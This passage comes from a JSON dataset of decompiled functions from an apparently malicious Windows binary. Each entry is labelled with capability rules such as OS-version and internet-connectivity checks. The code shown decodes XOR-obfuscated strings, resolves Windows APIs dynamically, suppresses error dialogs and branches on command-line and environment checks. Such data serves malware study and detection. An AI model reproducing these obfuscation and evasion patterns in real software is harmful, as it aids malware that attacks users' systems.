var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uint8_t var_ach [4];\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uint var_98h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uint8_t var_8ch [4];\n    uchar var_88h;\n    uchar var_87h;\n    uint8_t var_84h [4];\n    uchar var_80h;\n    uchar var_7fh;\n    uint var_7ch;\n    uchar var_78h;\n    uchar var_77h;\n    uint8_t var_74h [4];\n    uchar var_70h;\n    uchar var_6fh;\n    uint var_6ch;\n    uchar var_68h;\n    uint var_64h;\n    uchar var_60h;\n    uint var_5ch;\n    uchar var_58h;\n    uint var_54h;\n    uchar var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar *var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_194h = 0;\n    var_34h = NULL;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_168h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_164h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_1ch = 0;\n    puVar4 = var_168h;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = var_164h;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32\", \"SetErrorMode\");\n    var_174h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar2 = (*var_174h)(0);\n    (*var_174h)(uVar2 | 2);\n    var_d4h._0_1_ = 0x5a;\n    var_d4h._1_1_ = 0x6f;\n    var_d4h._2_1_ = 0x77;\n    var_d4h._3_1_ = 0x72;\n    var_d0h = 0x7d;\n    var_cfh = 0x7a;\n    var_ceh = 0xc;\n    var_cdh = 0x5a;\n    var_cch = 0x1e;\n    var_cbh = 0x50;\n    var_cah = 0x13;\n    var_c9h = 0x6f;\n    var_c8h = 0x3f;\n    var_c7h = 0x72;\n    var_c6h = 0x3e;\n    var_c5h = 0x7a;\n    var_c4h = 0x1b;\n    var_c3h = 0x5a;\n    var_c2h = 0x72;\n    var_c1h = 0x50;\n    var_6ch._0_1_ = 0x7a;\n    var_6ch._1_1_ = 0x6f;\n    var_6ch._2_1_ = 0x5a;\n    var_6ch._3_1_ = 0x72;\n    var_68h = 0x50;\n    fcn.004012a0(0x28);\n    for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_d4h + var_4h) ^ *(&var_6ch + var_4h % 5));\n    }\n    var_e8h._0_1_ = 0x55;\n    var_e8h._1_1_ = 0x37;\n    var_e8h._2_1_ = 0x7b;\n    var_e8h._3_1_ = 0x47;\n    var_e4h = 0x57;\n    var_e3h = 0x75;\n    var_e2h = 0x44;\n    var_e1h = 0x56;\n    var_e0h = 0x22;\n    var_dfh = 0x7a;\n    var_deh = 7;\n    var_ddh = 0x37;\n    var_dch = 0x20;\n    var_dbh = 0x47;\n    var_dah = 0x1f;\n    var_d9h = 0x75;\n    var_d8h = 0x45;\n    var_d7h = 0x56;\n    var_d6h = 0x47;\n    var_d5h = 0x7a;\n    var_64h._0_1_ = 0x75;\n    var_64h._1_1_ = 0x37;\n    var_64h._2_1_ = 0x56;\n    var_64h._3_1_ = 0x47;\n    var_60h = 0x7a;\n    fcn.004012a0(0x28);\n    for (var_8h = 0; var_8h < 0x14; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_e8h + var_8h) ^ *(&var_64h + var_8h % 5));\n    }\n    var_c0h[0] = 0x12;\n    var_c0h[1] = 0x5e;\n    var_c0h[2] = 0x58;\n    var_c0h[3] = 0x23;\n    var_bch = 0x3b;\n    var_bbh = 0x37;\n    var_bah = 0x35;\n    var_b9h = 0x7d;\n    var_b8h = 0x5c;\n    var_b7h = 0x20;\n    var_b6h = 0x3f;\n    var_b5h = 0xd;\n    var_b4h = 0x3e;\n    var_b3h = 0x70;\n    var_b2h = 0x47;\n    var_b1h = 0x29;\n    var_b0h = 0x2c;\n    var_afh = 0xe;\n    var_aeh = 0x51;\n    var_7ch._0_1_ = 0x51;\n    var_7ch._1_1_ = 0x31;\n    var_7ch._2_1_ = 0x35;\n    var_7ch._3_1_ = 0x4e;\n    var_78h = 0x5a;\n    var_77h = 0x59;\n    fcn.004012a0(0x13);\n    for (var_ch = 0; var_ch < 0x13; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, var_c0h[var_ch] ^ *(&var_7ch + var_ch % 6));\n    }\n    var_98h._0_1_ = 0x26;\n    var_98h._1_1_ = 0x2c;\n    var_98h._2_1_ = 0x28;\n    var_98h._3_1_ = 0x1d;\n    var_94h = 0x36;\n    var_93h = 0x78;\n    var_92h = 0x47;\n    var_91h = 0x4a;\n    var_90h = 9;\n    var_8fh = 0x3d;\n    var_8eh = 0x16;\n    var_8dh = 0x4b;\n    var_74h[0] = 0x75;\n    var_74h[1] = 100;\n    var_74h[2] = 0x6d;\n    var_74h[3] = 0x51;\n    var_70h = 0x7a;\n    var_6fh = 0x4b;\n    fcn.004012a0(0xc);\n    for (var_10h = 0; var_10h < 0xc; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_98h + var_10h) ^ var_74h[var_10h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    var_190h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    var_1ch = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    (*var_190h)(var_1ch, &var_194h);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    var_34h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    puVar4 = var_34h;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, var_34h, 0x104);\n    *0x436b44 = var_34h;\n    *0x436b54 = fcn.00423830();\n    fcn.00417c70();\n    iVar3 = fcn.00419ff0(var_1ch);\n    if (iVar3 == 0) {\n        iVar3 = fcn.0041a100(var_1ch);\n        if (iVar3 != 0) {\n            var_ach[0] = 0x1f;\n            var_ach[1] = 10;\n            var_ach[2] = 0x33;\n            var_ach[3] = 0x3f;\n            var_a8h = 0x7c;\n            var_a7h = 0x38;\n            var_a6h = 7;\n            var_a5h = 0x1c;\n            var_a4h = 0x29;\n            var_a3h = 0x3f;\n            var_a2h = 0x77;\n            var_a1h = 0x28;\n            var_a0h = 0x1f;\n            var_9fh = 0x10;\n            var_9eh = 0x24;\n            var_9dh = 0x28;\n            var_9ch = 0x76;\n            var_9bh = 0x79;\n            var_84h[0] = 0x4a;\n            var_84h[1] = 0x59;\n            var_84h[2] = 0x76;\n            var_84h[3] = 0x6d;\n            var_80h = 0x32;\n            var_7fh = 0x79;\n            fcn.004012a0(0x12);\n            for (var_14h = 0; var_14h < 0x12; var_14h = var_14h + 1) {\n                fcn.00401280(var_14h, var_ach[var_14h] ^ var_84h[var_14h % 6]);\n            }\n            var_5ch._0_1_ = 0xd;\n            var_5ch._1_1_ = 100;\n            var_5ch._2_1_ = 0x1c;\n            var_5ch._3_1_ = 0xe;\n            var_58h = 0x49;\n            var_54h._0_1_ = 0x59;\n            var_54h._1_1_ = 0x36;\n            var_54h._2_1_ = 0x49;\n            var_54h._3_1_ = 0x4b;\n            var_50h = 0x49;\n            fcn.004012a0(5);\n            for (var_18h = 0; var_18h < 5; var_18h = var_18h + 1) {\n                fcn.00401280(var_18h, *(&var_5ch + var_18h) ^ *(&var_54h + var_18h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar1 = fcn.00401270(uVar1);\n            (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uVar1);\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        iVar3 = fcn.0041a210(var_1ch);\n        if (iVar3 == 0) {\n            iVar3 = fcn.0041a300(var_1ch);\n            if (iVar3 != 0) {\n                fcn.00409ea0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                return 0;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0x4df);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00419fe0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n        *0x436b4c = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        var_184h = fcn.0041dc40(uVar1);\n        var_30h = 0;\n        var_178h = 0;\n        var_17ch = 0;\n        var_180h = 0;\n        var_30h = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        var_178h = var_30h & 0xff;\n        var_17ch = (var_30h & 0xffff) >> 8;\n        if (var_30h < 0x80000000) {\n            var_180h = var_30h >> 0x10;\n        }\n        if (var_184h == 1) {\n            fcn.0041f8c0(*0x436b44);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_34h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n        var_160h._0_1_ = 0x7f;\n        var_160h._1_1_ = 0x48;\n        var_160h._2_1_ = 0x70;\n        var_160h._3_1_ = 0x6b;\n        var_15ch = 0x21;\n        var_15bh = 0x39;\n        var_15ah = 10;\n        var_159h = 0x48;\n        var_158h = 0x75;\n        var_157h = 0x6b;\n        var_156h = 0x30;\n        var_155h = 0x39;\n        var_154h = 0xe;\n        var_153h = 0x48;\n        var_152h = 0x70;\n        var_151h = 0x6b;\n        var_150h = 0x54;\n        var_14fh = 0x39;\n        var_14eh = 6;\n        var_14dh = 0x48;\n        var_14ch = 0x7c;\n        var_14bh = 0x6b;\n        var_14ah = 0x18;\n        var_149h = 0x39;\n        var_148h = 0x39;\n        var_147h = 0x48;\n        var_146h = 0x43;\n        var_145h = 0x6b;\n        var_144h = 0x1e;\n        var_143h = 0x39;\n        var_142h = 0x29;\n        var_141h = 0x48;\n        var_140h = 0x5e;\n        var_13fh = 0x6b;\n        var_13eh = 0x17;\n        var_13dh = 0x39;\n        var_13ch = 0x2e;\n        var_13bh = 0x48;\n        var_13ah = 0x6d;\n        var_139h = 0x6b;\n        var_138h = 0x38;\n        var_137h = 0x39;\n        var_136h = 0x34;\n        var_135h = 0x48;\n        var_134h = 0x45;\n        var_133h = 0x6b;\n        var_132h = 0x14;\n        var_131h = 0x39;\n        var_130h = 0x28;\n        var_12fh = 0x48;\n        var_12eh = 0x5f;\n        var_12dh = 0x6b;\n        var_12ch = 0x14;\n        var_12bh = 0x39;\n        var_12ah = 0x2e;\n        var_129h = 0x48;\n        var_128h = 0x11;\n        var_127h = 0x6b;\n        var_126h = 0x34;\n        var_125h = 0x39;\n        var_124h = 0x22;\n        var_123h = 0x48;\n        var_122h = 0x41;\n        var_121h = 0x6b;\n        var_120h = 0x1d;\n        var_11fh = 0x39;\n        var_11eh = 0x35;\n        var_11dh = 0x48;\n        var_11ch = 0x43;\n        var_11bh = 0x6b;\n        var_11ah = 0x14;\n        var_119h = 0x39;\n        var_118h = 0x28;\n        var_117h = 0x48;\n        var_116h = 0x6d;\n        var_115h = 0x6b;\n        var_114h = 0x71;\n        var_113h = 0x39;\n        var_8ch[0] = 0x5a;\n        var_8ch[1] = 0x48;\n        var_8ch[2] = 0x31;\n        var_8ch[3] = 0x6b;\n        var_88h = 0x71;\n        var_87h = 0x39;\n        fcn.004012a0(0x9c);\n        for (var_20h = 0; var_20h < 0x4e; var_20h = var_20h + 1) {\n            fcn.00401280(var_20h, *(&var_160h + var_20h) ^ var_8ch[var_20h % 6]);\n        }\n        var_110h[0] = 0x60;\n        var_110h[1] = 0x54;\n        var_110h[2] = 0x67;\n        var_110h[3] = 0x6f;\n        var_10ch = 0x13;\n        var_10bh = 0x45;\n        var_10ah = 0x27;\n        var_109h = 0x34;\n        var_108h = 0x1b;\n        var_107h = 0x6a;\n        var_106h = 0x20;\n        var_105h = 0x54;\n        var_104h = 0x59;\n        var_103h = 0x6f;\n        var_102h = 0x38;\n        var_101h = 0x45;\n        var_100h = 0x3b;\n        var_ffh = 0x34;\n        var_feh = 0;\n        var_fdh = 0x6a;\n        var_fch = 0x31;\n        var_fbh = 0x54;\n        var_fah = 0x11;\n        var_f9h = 0x6f;\n        var_f8h = 0x36;\n        var_f7h = 0x45;\n        var_f6h = 0;\n        var_f5h = 0x34;\n        var_f4h = 0xe;\n        var_f3h = 0x6a;\n        var_f2h = 0x36;\n        var_f1h = 0x54;\n        var_f0h = 0x5f;\n        var_efh = 0x6f;\n        var_eeh = 0x19;\n        var_edh = 0x45;\n        var_ech = 8;\n        var_ebh = 0x34;\n        var_eah = 0x6f;\n        var_e9h = 0x6a;\n        var_4ch._0_1_ = 0x45;\n        var_4ch._1_1_ = 0x54;\n        var_4ch._2_1_ = 0x34;\n        var_4ch._3_1_ = 0x6f;\n        var_48h = 0x6a;\n        fcn.004012a0(0x50);\n        for (var_24h = 0; var_24h < 0x28; var_24h = var_24h + 1) {\n            fcn.00401280(var_24h, var_110h[var_24h] ^ *(&var_4ch + var_24h % 5));\n        }\n        uVar1 = fcn.00401270(var_168h, 0x104);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar1);\n        uVar1 = fcn.00401270(var_164h, 0x104);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar1);\n        iVar3 = fcn.00421570();\n        if ((iVar3 == 0) && ((iVar3 = fcn.00411cd0(),  iVar3 != 0 || (iVar3 = fcn.00413720(*0x436b44),  iVar3 != 0)))) {\n            fcn.0041bb20(*0x436b44);\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n            uStack396 = 0;\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n            fcn.00419c50(uVar1);\n            fcn.00417840();\n            uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00420070, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_168h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_164h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            var_18ch = 0;\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            uStack396 = var_18ch;\n        }\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00415960, 0, 0, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar1);\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        uStack396 = 0;\n    }\n    return uStack396;\n}\n",
        "token_count": 7328
    },
    "0041b230": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0041b230(char *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_8h;\n    char *var_4h;\n    \n    var_4h = NULL;\n    do {\n        if (*arg_8h == arg_ch) {\n            var_4h = arg_8h;\n        }\n        cVar1 = *arg_8h;\n        arg_8h = arg_8h + 1;\n    } while (cVar1 != '\\0');\n    return var_4h;\n}\n",
        "token_count": 126
    },
    "0041b280": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b280(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_8h != 0) && (1 < arg_ch)) {\n        for (var_4h = arg_ch + -1; -1 < var_4h; var_4h = var_4h + -1) {\n            if (*(arg_8h + var_4h) == arg_10h) {\n                return arg_8h + var_4h;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 150
    },
    "0041b3d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0041b3d0(int16_t *arg_8h, int16_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t *var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    for (var_4h = arg_8h; *var_4h != 0; var_4h = var_4h + 1) {\n    }\n    var_ch = var_4h;\n    var_8h = arg_ch;\n    for (; (*var_8h != 0 && (arg_10h != 0)); arg_10h = arg_10h + -1) {\n        *var_ch = *var_8h;\n        var_ch = var_ch + 1;\n        var_8h = var_8h + 1;\n    }\n    *var_ch = 0;\n    return arg_8h;\n}\n",
        "token_count": 214
    },
    "0041b470": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n\nint32_t __cdecl fcn.0041b470(int32_t arg_8h, uint lpString2, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint16_t *var_10h;\n    int32_t *var_ch;\n    uint lpString1;\n    uint var_4h;\n    \n    uVar3 = fcn.0041b450(arg_8h);\n    iVar4 = fcn.0041b590(arg_8h);\n    if (((iVar4 != 0) && (*(iVar4 + 0x1c) != 0)) && (*(iVar4 + 0x20) != 0)) {\n        iVar1 = *(iVar4 + 0x1c);\n        var_ch = arg_8h + *(iVar4 + 0x20);\n        var_10h = arg_8h + *(iVar4 + 0x24);\n        uVar2 = *(iVar4 + 0x18);\n        for (var_14h = 0; var_14h < uVar2; var_14h = var_14h + 1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(arg_8h + *var_ch, lpString2, uVar3, 0, 0);\n            if (iVar4 == 0) {\n                iVar4 = arg_8h + iVar1 + *var_10h * 4;\n                if (arg_10h != NULL) {\n                    *arg_10h = arg_8h + *var_ch;\n                    return iVar4;\n                }\n                return iVar4;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 512
    },
    "0041b6a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041b6a0(int32_t hObject, uint *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uint var_24h;\n    uchar var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    _var_34h = 0;\n    var_14h = 0;\n    if (hObject == -1) {\n        var_14h = 1;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        hObject = fcn.0041cd10(uVar1);\n    }\n    if (*0x436b40 == NULL) {\n        var_40h._0_1_ = 0x27;\n        var_40h._1_1_ = 0x1f;\n        var_40h._2_1_ = 5;\n        var_40h._3_1_ = 1;\n        var_3ch = 0x3d;\n        var_3bh = 0x67;\n        var_3ah = 0xf;\n        var_39h = 0xd;\n        var_38h = 1;\n        var_37h = 0x51;\n        var_24h._0_1_ = 0x49;\n        var_24h._1_1_ = 0x6b;\n        var_24h._2_1_ = 0x61;\n        var_24h._3_1_ = 0x6d;\n        var_20h = 0x51;\n        fcn.004012a0(10);\n        for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n            fcn.00401280(var_4h, *(&var_40h + var_4h) ^ *(&var_24h + var_4h % 5));\n        }\n        var_5ch._0_1_ = 0x6d;\n        var_5ch._1_1_ = 0x22;\n        var_5ch._2_1_ = 0x26;\n        var_5ch._3_1_ = 5;\n        var_58h = 0x42;\n        var_57h = 4;\n        var_56h = 3;\n        var_55h = 2;\n        var_54h = 3;\n        var_53h = 3;\n        var_52h = 0x41;\n        var_51h = 0x57;\n        var_50h = 0x61;\n        var_4fh = 0x3c;\n        var_4eh = 3;\n        var_4dh = 0x1e;\n        var_4ch = 0x40;\n        var_4bh = 0x53;\n        var_4ah = 0x5b;\n        var_49h = 0x18;\n        var_48h = 0x14;\n        var_47h = 7;\n        var_46h = 0x5a;\n        var_45h = 0x40;\n        var_44h = 0x4e;\n        var_43h = 99;\n        var_42h = 0x45;\n        var_41h = 0x6a;\n        var_2ch._0_1_ = 0x37;\n        var_2ch._1_1_ = 0x55;\n        var_2ch._2_1_ = 0x71;\n        var_2ch._3_1_ = 0x6a;\n        var_28h = 0x35;\n        var_27h = 0x32;\n        fcn.004012a0(0x1c);\n        for (var_8h = 0; var_8h < 0x1c; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_5ch + var_8h) ^ *(&var_2ch + var_8h % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n        *0x436b40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    if ((*0x436b40 != NULL) &&\n       (var_1ch = (**0x436b40)(hObject, *arg_ch, arg_ch[1], arg_10h, arg_14h, 0, &var_34h),  -1 < var_1ch)) {\n        var_18h = var_34h;\n    }\n    if (var_14h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return var_18h;\n}\n",
        "token_count": 1459
    },
    "0041b8e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041b8e0(int32_t hObject, uint *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uint var_24h;\n    uchar var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    _var_34h = 0;\n    var_14h = 0;\n    if (hObject == -1) {\n        var_14h = 1;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        hObject = fcn.0041cd10(uVar1);\n    }\n    if (*0x436b14 == NULL) {\n        var_40h._0_1_ = 0x27;\n        var_40h._1_1_ = 0x1f;\n        var_40h._2_1_ = 5;\n        var_40h._3_1_ = 1;\n        var_3ch = 0x3d;\n        var_3bh = 0x67;\n        var_3ah = 0xf;\n        var_39h = 0xd;\n        var_38h = 1;\n        var_37h = 0x51;\n        var_24h._0_1_ = 0x49;\n        var_24h._1_1_ = 0x6b;\n        var_24h._2_1_ = 0x61;\n        var_24h._3_1_ = 0x6d;\n        var_20h = 0x51;\n        fcn.004012a0(10);\n        for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n            fcn.00401280(var_4h, *(&var_40h + var_4h) ^ *(&var_24h + var_4h % 5));\n        }\n        var_5ch._0_1_ = 0x17;\n        var_5ch._1_1_ = 0x33;\n        var_5ch._2_1_ = 0x2f;\n        var_5ch._3_1_ = 0x59;\n        var_58h = 1;\n        var_57h = 0x7f;\n        var_56h = 0x79;\n        var_55h = 0x16;\n        var_54h = 0x1d;\n        var_53h = 0x57;\n        var_52h = 0x12;\n        var_51h = 0x1f;\n        var_50h = 0x24;\n        var_4fh = 0x36;\n        var_4eh = 0xc;\n        var_4dh = 0x43;\n        var_4ch = 0x17;\n        var_4bh = 0x25;\n        var_4ah = 0;\n        var_49h = 0x21;\n        var_48h = 0x15;\n        var_47h = 0x59;\n        var_46h = 4;\n        var_45h = 0x30;\n        var_44h = 0x7b;\n        var_43h = 0x70;\n        var_42h = 0x78;\n        var_2ch._0_1_ = 0x4d;\n        var_2ch._1_1_ = 0x44;\n        var_2ch._2_1_ = 0x78;\n        var_2ch._3_1_ = 0x36;\n        var_28h = 0x76;\n        var_27h = 0x49;\n        fcn.004012a0(0x1b);\n        for (var_8h = 0; var_8h < 0x1b; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_5ch + var_8h) ^ *(&var_2ch + var_8h % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n        *0x436b14 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    if ((*0x436b14 != NULL) &&\n       (var_1ch = (**0x436b14)(hObject, *arg_ch, arg_ch[1], arg_10h, arg_14h, 0, &var_34h),  -1 < var_1ch)) {\n        var_18h = var_34h;\n    }\n    if (var_14h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return var_18h;\n}\n",
        "token_count": 1450
    },
    "0041bb20": {
        "rules": [
